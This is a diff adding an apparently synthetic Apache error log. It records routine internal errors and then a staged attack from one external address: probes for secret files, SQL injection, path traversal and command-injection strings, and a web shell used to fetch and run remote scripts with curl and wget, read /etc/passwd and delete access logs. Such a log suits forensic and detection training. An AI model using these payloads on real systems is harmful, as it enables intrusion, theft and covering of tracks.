@@ -1,0 +1,174 @@
+[Sat Jan  3 09:00:00.000000 2026] [error] [client 10.20.0.9] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:00:15.000631 2026] [error] [client 10.20.0.22] File does not exist: /var/www/html/api/v1/cart
+[Sat Jan  3 09:00:31.000028 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 3473)
+[Sat Jan  3 09:00:44.000912 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 6209)
+[Sat Jan  3 09:01:11.000105 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 2947)
+[Sat Jan  3 09:01:28.000444 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 6772)
+[Sat Jan  3 09:01:38.000965 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 3323)
+[Sat Jan  3 09:01:53.000216 2026] [error] [client 10.20.0.9] File does not exist: /var/www/html/index.php
+[Sat Jan  3 09:02:04.000349 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 9672)
+[Sat Jan  3 09:02:34.000907 2026] [notice] [client 10.20.0.22] caught SIGTERM, shutting down worker (pid 5917)
+[Sat Jan  3 09:02:59.000119 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 5163)
+[Sat Jan  3 09:03:08.000616 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 9894)
+[Sat Jan  3 09:03:30.000385 2026] [error] [client 10.20.0.22] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:03:43.000636 2026] [error] [client 10.20.0.22] File does not exist: /var/www/html/api/v1/cart
+[Sat Jan  3 09:03:47.000746 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 6569)
+[Sat Jan  3 09:03:52.000924 2026] [error] [client 10.20.3.51] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:04:13.000618 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 5195)
+[Sat Jan  3 09:04:24.000835 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 6663)
+[Sat Jan  3 09:04:39.000295 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 8235)
+[Sat Jan  3 09:05:05.000716 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 6117)
+[Sat Jan  3 09:05:14.000023 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 2372)
+[Sat Jan  3 09:05:44.000855 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 3873)
+[Sat Jan  3 09:06:15.000160 2026] [error] [client 10.20.3.51] File does not exist: /var/www/html/api/v1/cart
+[Sat Jan  3 09:06:21.000806 2026] [notice] [client 10.20.0.22] caught SIGTERM, shutting down worker (pid 4373)
+[Sat Jan  3 09:06:45.000100 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 2344)
+[Sat Jan  3 09:07:03.000341 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 5692)
+[Sat Jan  3 09:07:25.000261 2026] [notice] [client 10.20.0.9] caught SIGTERM, shutting down worker (pid 4203)
+[Sat Jan  3 09:07:34.000834 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 3823)
+[Sat Jan  3 09:07:45.000269 2026] [notice] [client 10.20.0.22] caught SIGTERM, shutting down worker (pid 6106)
+[Sat Jan  3 09:07:52.000574 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 1168)
+[Sat Jan  3 09:07:58.000804 2026] [error] [client 10.20.0.14] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:08:08.000072 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 3891)
+[Sat Jan  3 09:08:16.000063 2026] [notice] [client 10.20.0.22] caught SIGTERM, shutting down worker (pid 3652)
+[Sat Jan  3 09:08:36.000841 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 5917)
+[Sat Jan  3 09:09:07.000530 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 9973)
+[Sat Jan  3 09:09:34.000046 2026] [error] [client 10.20.0.14] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:09:47.000267 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 3205)
+[Sat Jan  3 09:10:10.000649 2026] [error] [client 10.20.0.9] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:10:31.000269 2026] [error] [client 10.20.3.51] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:10:43.000723 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 7231)
+[Sat Jan  3 09:11:03.000989 2026] [notice] [client 10.20.0.14] caught SIGTERM, shutting down worker (pid 8533)
+[Sat Jan  3 09:11:17.000228 2026] [notice] [client 10.20.3.51] caught SIGTERM, shutting down worker (pid 5752)
+[Sat Jan  3 09:11:39.000218 2026] [error] [client 10.20.3.51] File does not exist: /var/www/html/docs/getting-started
+[Sat Jan  3 09:11:45.000518 2026] [error] [client 10.20.3.51] File does not exist: /var/www/html/favicon.ico
+[Sat Jan  3 09:12:02.000686 2026] [error] [client 10.20.0.14] File does not exist: /var/www/html/login
+[Sat Jan  3 09:12:06.000972 2026] [error] [client 10.20.0.14] File does not exist: /var/www/html/api/v1/orders
+[Sat Jan  3 09:18:17.000879 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.git/config
+[Sat Jan  3 09:18:23.000457 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.git/HEAD
+[Sat Jan  3 09:18:29.000368 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.env
+[Sat Jan  3 09:18:34.000342 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.aws/credentials
+[Sat Jan  3 09:18:42.000096 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/wp-login.php
+[Sat Jan  3 09:18:47.000663 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/wp-admin/
+[Sat Jan  3 09:18:53.000311 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/phpmyadmin/
+[Sat Jan  3 09:18:56.000056 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/adminer.php
+[Sat Jan  3 09:19:02.000172 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[Sat Jan  3 09:19:08.000112 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/api/v1/users
+[Sat Jan  3 09:19:16.000735 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/api/v1/admin
+[Sat Jan  3 09:19:22.000876 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/server-status
+[Sat Jan  3 09:19:31.000239 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.svn/entries
+[Sat Jan  3 09:19:37.000781 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/config.php.bak
+[Sat Jan  3 09:19:47.000160 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/backup.sql
+[Sat Jan  3 09:19:49.000454 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/debug
+[Sat Jan  3 09:19:52.000329 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/actuator/env
+[Sat Jan  3 09:19:57.000433 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/graphql
+[Sat Jan  3 09:20:01.000118 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.DS_Store
+[Sat Jan  3 09:20:03.000779 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/wp-content/uploads/
+[Sat Jan  3 09:20:08.000933 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/cgi-bin/
+[Sat Jan  3 09:20:14.000101 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/shell.php
+[Sat Jan  3 09:20:17.000385 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/api/swagger.json
+[Sat Jan  3 09:20:25.000855 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/.dockerenv
+[Sat Jan  3 09:20:35.000186 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/WEB-INF/web.xml
+[Sat Jan  3 09:20:39.000232 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/a
+[Sat Jan  3 09:20:40.000429 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/aa
+[Sat Jan  3 09:20:42.000552 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/ab
+[Sat Jan  3 09:20:44.000538 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/api
+[Sat Jan  3 09:20:46.000913 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/api/v2
+[Sat Jan  3 09:20:48.000162 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/assets
+[Sat Jan  3 09:20:51.000759 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/b
+[Sat Jan  3 09:20:54.000763 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/bin
+[Sat Jan  3 09:20:58.000502 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/cgi
+[Sat Jan  3 09:21:02.000246 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/components
+[Sat Jan  3 09:21:03.000849 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/config
+[Sat Jan  3 09:21:07.000841 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/css
+[Sat Jan  3 09:21:10.000799 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/d
+[Sat Jan  3 09:21:13.000690 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/db
+[Sat Jan  3 09:21:16.000283 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/debug
+[Sat Jan  3 09:21:17.000811 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/dev
+[Sat Jan  3 09:21:22.000617 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/dist
+[Sat Jan  3 09:21:26.000056 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/docs
+[Sat Jan  3 09:21:29.000996 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/e
+[Sat Jan  3 09:21:32.000270 2026] [error] [client 203.0.113.77] File does not exist: /var/www/html/f
+[Sat Jan  3 09:25:34.000275 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id='%20OR%20'1'='1 HTTP/1.1
+[Sat Jan  3 09:25:37.000409 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id=1%20UNION%20SELECT%20NULL,version(),3-- HTTP/1.1
+[Sat Jan  3 09:25:46.000433 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id=admin'-- HTTP/1.1
+[Sat Jan  3 09:25:51.000629 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id=1;%20DROP%20TABLE%20users-- HTTP/1.1
+[Sat Jan  3 09:25:57.000172 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id=1'%20AND%20SLEEP(5)-- HTTP/1.1
+[Sat Jan  3 09:26:05.000797 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?option=com_content&task=view&id='%20UNION%20ALL%20SELECT%20password%20FROM%20users-- HTTP/1.1
+[Sat Jan  3 09:26:15.000998 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?page=../../../../etc/passwd HTTP/1.1
+[Sat Jan  3 09:26:21.000425 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?page=....//....//etc/passwd HTTP/1.1
+[Sat Jan  3 09:26:33.000357 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?page=/etc/passwd%00 HTTP/1.1
+[Sat Jan  3 09:26:44.000311 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
+[Sat Jan  3 09:26:53.000699 2026] [error] [client 198.51.100.23] Invalid URI in request GET /index.php?page=file:///etc/shadow HTTP/1.1
+[Sat Jan  3 09:27:00.000986 2026] [error] [client 198.51.100.23] Invalid URI in request POST /index.php?cmd=;cat%20/etc/passwd HTTP/1.1
+[Sat Jan  3 09:27:10.000285 2026] [error] [client 198.51.100.23] Invalid URI in request POST /index.php?cmd=|id HTTP/1.1
+[Sat Jan  3 09:27:18.000423 2026] [error] [client 198.51.100.23] Invalid URI in request POST /index.php?cmd=`whoami` HTTP/1.1
+[Sat Jan  3 09:27:28.000099 2026] [error] [client 198.51.100.23] Invalid URI in request POST /index.php?cmd=&&curl%20http://198.51.100.23/x.sh|sh HTTP/1.1
+[Sat Jan  3 09:27:38.000907 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:27:50.000073 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:28:10.000474 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:28:17.000382 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:28:33.000128 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:28:51.000402 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:29:06.000683 2026] [error] [client 198.51.100.23] mod_security: Access denied with code 403 (phase 2). Matched "UNION SELECT" against ARGS:args:0 [file "/var/www/html/index.php"] [msg "SQL Injection Attack"]
+[Sat Jan  3 09:38:23.000434 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/uploads/2025/img/shell.php
+[Sat Jan  3 09:38:26.000638 2026] [notice] [client 198.51.100.23] PHP Warning: include(): Failed opening '/var/www/html/uploads/2025/img/shell.php' for inclusion in /var/www/html/index.php on line 42
+[Sat Jan  3 09:38:31.000727 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=id HTTP/1.1
+[Sat Jan  3 09:38:35.000748 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=uname%20-a HTTP/1.1
+[Sat Jan  3 09:38:43.000683 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=whoami HTTP/1.1
+[Sat Jan  3 09:38:50.000623 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
+[Sat Jan  3 09:38:53.000849 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=ls%20-la%20/var/www HTTP/1.1
+[Sat Jan  3 09:38:57.000335 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=wget%20http://198.51.100.23/p.sh HTTP/1.1
+[Sat Jan  3 09:39:01.000206 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=curl%20-s%20http://198.51.100.23/x|bash HTTP/1.1
+[Sat Jan  3 09:39:05.000672 2026] [error] [client 198.51.100.23] PHP Fatal error: Uncaught Error: Call to undefined function mysql_query() in /var/www/html/uploads/2025/img/shell.php on line 7
+[Sat Jan  3 09:46:11.000820 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=0 HTTP/1.1
+[Sat Jan  3 09:46:16.000626 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=4096 HTTP/1.1
+[Sat Jan  3 09:46:18.000558 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=8192 HTTP/1.1
+[Sat Jan  3 09:46:20.000184 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=12288 HTTP/1.1
+[Sat Jan  3 09:46:23.000008 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=16384 HTTP/1.1
+[Sat Jan  3 09:46:24.000627 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=20480 HTTP/1.1
+[Sat Jan  3 09:46:26.000046 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=24576 HTTP/1.1
+[Sat Jan  3 09:46:29.000461 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=28672 HTTP/1.1
+[Sat Jan  3 09:46:32.000677 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=32768 HTTP/1.1
+[Sat Jan  3 09:46:35.000190 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=36864 HTTP/1.1
+[Sat Jan  3 09:46:39.000032 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=40960 HTTP/1.1
+[Sat Jan  3 09:46:43.000943 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=45056 HTTP/1.1
+[Sat Jan  3 09:46:46.000289 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=49152 HTTP/1.1
+[Sat Jan  3 09:46:49.000884 2026] [error] [client 198.51.100.23] Invalid URI in request GET /uploads/2025/img/shell.php?f=passwd&o=53248 HTTP/1.1
+[Sat Jan  3 09:46:54.000522 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=rm%20-f%20/var/log/apache2/access.log HTTP/1.1
+[Sat Jan  3 09:46:57.000814 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=rm%20-f%20/var/log/apache2/access.log HTTP/1.1
+[Sat Jan  3 09:47:01.000000 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=rm%20-f%20/var/log/apache2/access.log HTTP/1.1
+[Sat Jan  3 09:47:07.000854 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=rm%20-f%20/var/log/apache2/access.log HTTP/1.1
+[Sat Jan  3 09:47:11.000680 2026] [error] [client 198.51.100.23] Invalid URI in request POST /uploads/2025/img/shell.php?cmd=rm%20-f%20/var/log/apache2/access.log HTTP/1.1
+[Sat Jan  3 09:47:16.000594 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-0.html
+[Sat Jan  3 09:47:16.000680 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-1.html
+[Sat Jan  3 09:47:17.000603 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-2.html
+[Sat Jan  3 09:47:17.000920 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-3.html
+[Sat Jan  3 09:47:20.000569 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-4.html
+[Sat Jan  3 09:47:23.000500 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-5.html
+[Sat Jan  3 09:47:24.000271 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-6.html
+[Sat Jan  3 09:47:26.000763 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-7.html
+[Sat Jan  3 09:47:26.000785 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-8.html
+[Sat Jan  3 09:47:29.000062 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-9.html
+[Sat Jan  3 09:47:29.000794 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-10.html
+[Sat Jan  3 09:47:31.000444 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-11.html
+[Sat Jan  3 09:47:31.000975 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-12.html
+[Sat Jan  3 09:47:33.000868 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-13.html
+[Sat Jan  3 09:47:35.000246 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-14.html
+[Sat Jan  3 09:47:37.000287 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-15.html
+[Sat Jan  3 09:47:39.000717 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-16.html
+[Sat Jan  3 09:47:42.000395 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-17.html
+[Sat Jan  3 09:47:43.000639 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-18.html
+[Sat Jan  3 09:47:45.000212 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-19.html
+[Sat Jan  3 09:47:45.000308 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-20.html
+[Sat Jan  3 09:47:47.000182 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-21.html
+[Sat Jan  3 09:47:48.000786 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-22.html
+[Sat Jan  3 09:47:50.000404 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-23.html
+[Sat Jan  3 09:47:51.000788 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-24.html
+[Sat Jan  3 09:47:52.000091 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-25.html
+[Sat Jan  3 09:47:53.000060 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-26.html
+[Sat Jan  3 09:47:54.000420 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-27.html
+[Sat Jan  3 09:47:56.000581 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-28.html
+[Sat Jan  3 09:47:57.000324 2026] [error] [client 198.51.100.23] File does not exist: /var/www/html/404-29.html
+[Sat Jan  3 09:47:57.000738 2026] [error] [client 10.20.0.22] File does not exist: /var/www/html/admin/login.php
+[Sat Jan  3 09:48:56.000552 2026] [error] [client 10.20.0.14] File does not exist: /var/www/html/admin/panel.php
